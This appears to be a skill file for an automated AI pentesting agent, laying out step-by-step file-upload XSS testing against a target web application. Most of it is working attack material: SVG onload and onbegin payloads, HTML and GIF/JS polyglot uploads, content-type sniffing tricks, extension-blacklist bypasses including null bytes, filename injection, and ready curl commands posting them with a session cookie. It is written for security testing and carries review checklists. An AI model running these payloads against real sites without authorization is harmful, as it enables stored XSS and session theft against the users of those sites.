---
name: file_upload_xss
agent: agent6_xss
description: SVG/HTML uploads, content-type sniffing, and polyglot files that execute as script.
---

# File Upload XSS

## Purpose

File uploads are stored XSS with a file extension. Every upload feature is really two questions: (1) can I get the server to STORE my content, and (2) can I get a victim's browser to EXECUTE it? SVG files are XML — `<svg onload=alert(1)>` is valid SVG and valid XSS. HTML files served with the wrong content-type execute. Browsers sniff content types when servers misdeclare them. This skill tests every upload point on the target: what file types are accepted, how the content-type is determined and served, whether the file is served from the application's origin (same-origin = cookie access), and whether polyglots slip past extension checks. An SVG avatar served from the app's own domain is stored XSS with a profile picture.

## Division of labor

- **Consumes:** `findings/surface_inputs.txt` (every upload endpoint: avatars, attachments, imports, documents), `findings/stored_xss_chain.md` (upload-adjacent stored vectors like filenames), `findings/csp_bypass_map.md` (whether the serving origin's CSP matters).
- **Produces:** the finished artifact — `findings/file_upload_xss.md` — every upload point tested, the full accept/store/serve matrix, content-type behavior, and execution proof for each working vector. Test files under `evidence/file_upload_xss/`.

## When to use / when NOT to use

- **Use when:** any upload feature exists — avatars, profile pictures, attachments, document uploads, CSV imports, theme uploads, logo uploads, chat file sharing.
- **Use when:** the app serves user files from its own origin or a sibling subdomain (same-origin or same-site execution = session access).
- **Use when:** filename or content-type handling looks custom (not a well-known hardened uploader) — custom code makes mistakes.
- **Skip when (time-pass filter):** uploads are provably restricted to a hardened pipeline (e.g. images re-encoded server-side with verified output, served from a cookieless CDN with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`) — verify each claim once with a real upload, then stop. Don't keep uploading when the pipeline demonstrably neutralizes everything.

## Methodology

1. **Inventory every upload point.** For each: endpoint, method, field name, auth required, file size limits, and what the UI claims is accepted. Test authenticated AND unauthenticated where the endpoint might allow it.
2. **Baseline with a benign file.** Upload a normal PNG first. Record: the response (file URL? ID?), the served URL, the served `Content-Type`, `Content-Disposition`, `X-Content-Type-Options`, and whether the URL is same-origin, subdomain, or separate CDN domain. This is the control for everything after.
3. **Test SVG upload.** Upload `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>` as `xss.svg` with `Content-Type: image/svg+xml`. Then: fetch the served URL, check the served content-type, and load it in a browser. If it renders inline with `image/svg+xml` on the app origin → stored XSS.
4. **Test SVG disguised as an image.** Upload the same SVG content with filename `xss.png` and `Content-Type: image/png`. Many validators check only the extension. Check what content-type the server SERVES it as — if it sniffs and serves `image/svg+xml`, or serves your declared type, you win.
5. **Test HTML upload.** Upload `<script>alert(document.domain)</script>` as `xss.html`. If the app accepts it and serves it inline → direct stored XSS. Even if the uploader renames it to `.txt`, check the served content-type.
6. **Test content-type sniffing.** Upload HTML content with `Content-Type: image/jpeg` and filename `x.html`. Fetch it: does the server serve your declared type, sniff the real type, or force `application/octet-stream`? Then check the `X-Content-Type-Options: nosniff` header — absent nosniff + wrong content-type = the browser may sniff and execute. Test in a real browser (curl can't test sniffing).
7. **Test `Content-Disposition`.** `attachment` forces download (kills inline XSS but the file still downloads — note it). `inline` (or absent) allows rendering. Some apps set `attachment` only for certain extensions — find the ones they forgot.
8. **Test the serving origin.** Same origin (`app.com/uploads/x.svg`) = full session access on execution. Subdomain (`cdn.app.com`) = same-site, cookie tossing possible, but `document.cookie` for the parent is NOT readable (still XSS on the subdomain — reportable, slightly lower impact). Separate domain (`app-uploads.s3...`) = lowest impact but still XSS. Record exactly.
9. **Test polyglots.** Craft files valid as two types: GIF+JS polyglot (`GIF89a` header + `<script>` payload — passes "is it a GIF?" checks, executes as HTML when served wrong), PNG+HTML, PDF+JS. Upload each and check the served content-type.
10. **Test extension blacklist bypasses.** If `.html`/`.svg` are blocked: try `.svg.png`, `.html;.png`, `.phtml`, `.shtml`, `.xhtml`, `.svg%00.png` (null byte — mostly dead on modern stacks, test once), uppercase `.SVG`, double extensions `xss.svg.svg`. Record which the validator accepts vs what the server serves.
11. **Test filename XSS.** Upload with filename `"><svg onload=alert(1)>.png`. Check where the filename renders: file lists, admin panels, download dialogs, `Content-Disposition` headers. Filename reflection is stored XSS via the file manager UI.
12. **Test SVG-specific vectors.** Beyond `onload`: `<svg><animate onbegin=alert(1)>`, `<image href="javascript:alert(1)">`, `<foreignObject>` with embedded HTML, `<svg><g onload=...>`. Some sanitizers strip `onload` but miss `onbegin`.
13. **Test XML/XSLT vectors.** Upload `.xml` with an `<?xml-stylesheet?>` processing instruction pointing at attacker XSLT, or SVG with embedded `<handler>` (Adobe-era, mostly dead — test once on old stacks).
14. **Verify execution in a real browser, 2x.** Load the served file URL in a clean profile. Screenshot the execution. Also verify the session context: `alert(document.cookie)` proves cookie access on same-origin serves.
15. **Decision branches.**
    - If SVG/HTML serves inline from the app origin with script execution → critical stored XSS; document the full upload→serve→execute chain.
    - If it serves from a separate cookieless domain → still XSS, report with the correct impact (no session theft, but phishing/defacement/cookie-tossing).
    - If `nosniff` + `attachment` + re-encoding all hold → NEGATIVE for this upload point, documented with the evidence.
    - If the validator blocks everything but the filename reflects → pivot to filename XSS (stored, UI-rendered).

## Exact commands

Benign baseline upload:

```bash
mkdir -p evidence/file_upload_xss
printf '\x89PNG\r\n\x1a\n' > /tmp/pixel.png
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/pixel.png;type=image/png' \
  -o evidence/file_upload_xss/baseline.json
cat evidence/file_upload_xss/baseline.json
# note the returned file URL, then inspect how it is served:
curl -sSI "https://<TARGET>/uploads/<RETURNED_PATH>" | grep -iE 'content-type|content-disposition|x-content-type-options'
```

SVG execution test:

```bash
cat > /tmp/xss.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
EOF
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/xss.svg;type=image/svg+xml' \
  -o evidence/file_upload_xss/svg_upload.json
cat evidence/file_upload_xss/svg_upload.json
SERVED=$(python3 -c "import json;print(json.load(open('evidence/file_upload_xss/svg_upload.json'))['url'])")
curl -sSI "$SERVED" | grep -iE 'content-type|content-disposition|x-content-type-options'
# load $SERVED in a clean browser profile; screenshot any alert
```

SVG disguised as PNG (extension-check bypass):

```bash
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/xss.svg;filename="avatar.png";type=image/png' \
  -o evidence/file_upload_xss/svg_as_png.json
cat evidence/file_upload_xss/svg_as_png.json
```

HTML upload + sniffing test:

```bash
echo '<script>alert(document.domain)</script>' > /tmp/xss.html
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/xss.html;type=image/jpeg' \
  -o evidence/file_upload_xss/html_sniff.json
```

GIF/JS polyglot:

```bash
printf 'GIF89a<script>alert(document.domain)</script>' > /tmp/polyglot.gif
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/polyglot.gif;type=image/gif' \
  -o evidence/file_upload_xss/polyglot.json
cat evidence/file_upload_xss/polyglot.json
```

Extension bypass battery:

```bash
for ext in svg.png "html;.png" phtml shtml xhtml SVG "svg.svg"; do
  echo "== $ext"
  cp /tmp/xss.svg "/tmp/t.$ext"
  curl -sS -o /dev/null -w "%{http_code} " -X POST "https://<TARGET>/api/upload" \
    -H "Cookie: session=<YOUR_SESSION>" -F "file=@/tmp/t.$ext"
  echo
done
```

Filename XSS probe:

```bash
curl -sS -X POST "https://<TARGET>/api/upload" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -F 'file=@/tmp/pixel.png;filename="q1\"><svg onload=alert(1)>.png"' \
  -o evidence/file_upload_xss/filename.json
curl -sS "https://<TARGET>/files" -H "Cookie: session=<YOUR_SESSION>" --compressed \
  | grep -o '.\{30\}q1.\{60\}' | head -3
```

## Completion-bias defenses

- [ ] Every upload point inventoried with endpoint, method, field, auth, limits
- [ ] Benign baseline uploaded; served headers recorded (the control)
- [ ] SVG upload tested (correct type) with browser execution check
- [ ] SVG disguised as image tested (validator bypass)
- [ ] HTML upload tested
- [ ] Content-type sniffing tested (wrong declared type + nosniff check in a real browser)
- [ ] Content-Disposition recorded per vector (inline vs attachment)
- [ ] Serving origin classified (same-origin / subdomain / separate domain)
- [ ] Polyglot files tested (GIF/JS minimum)
- [ ] Extension bypass battery run (8 variants minimum)
- [ ] Filename XSS tested and render locations checked
- [ ] SVG-specific vectors tested (onbegin, foreignObject minimum)
- [ ] Execution proved in a real browser 2x with screenshots
- [ ] `findings/file_upload_xss.md` exists with the full accept/store/serve matrix
- [ ] **Review step:** agent10_review must verify: (a) the served headers (content-type, disposition, nosniff) are saved per vector, (b) execution was proved in a real browser (curl can't prove sniffing), (c) the serving origin classification is evidenced, (d) NEGATIVE verdicts show the benign upload succeeding (proves the endpoint was actually tested).
- [ ] **Nudge prompts:**
  - "Keep going until every upload point has a full accept/store/serve matrix — not just the avatar uploader."
  - "Do not report done before findings/file_upload_xss.md exists with browser proof for every CONFIRMED vector."
  - "The validator's 'no' is not the server's 'no'. Check what content-type is actually served."
- [ ] **Finished artifact definition:** `findings/file_upload_xss.md` — per upload point: the accept/store/serve matrix, served headers, origin classification, every bypass tested, and 2x browser execution proof per CONFIRMED vector. Existence + matrix IS done.

## Evidence standard

- Baseline: benign PNG upload with served headers (the control every vector compares against).
- Reproduction: each CONFIRMED vector executed 2x in clean browser profiles.
- Raw evidence: upload requests/responses, served-header dumps, the actual test files, browser screenshots.
- Verdicts: CONFIRMED (script executes from the served file, 2x) / INCONCLUSIVE (file stored but execution blocked by an untested condition — exact condition stated) / NEGATIVE (re-encoded/nosniff/attachment pipeline neutralizes it — evidenced).

## Handoffs

- `stored_xss_chain`: filename vectors and any upload whose content renders in app UI (not just direct file URL) feed the stored chain.
- `csp_bypass_map`: the serving origin's CSP applies to executed uploads — combine before the final proof.
- `blind_xss_callback`: SVG callbacks are a clean out-of-band proof when inline observation is hard.
- agent10_review: consumes `findings/file_upload_xss.md` plus served-header dumps and screenshots.
